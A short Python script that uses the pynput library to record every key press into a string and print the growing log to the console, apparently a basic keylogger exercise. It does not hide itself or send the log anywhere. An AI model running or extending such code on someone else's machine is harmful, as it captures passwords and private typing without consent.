# !/usr/bin/env python

import pynput.keyboard
log = ""

def proccess_key_press(key):
  global log
  log = log + str(key)
  print(log)

keyboard_listener = pynput.keyboard.Listener(on_press=proccess_key_press)

with keyboard_listener:
  keyboard_listener.join()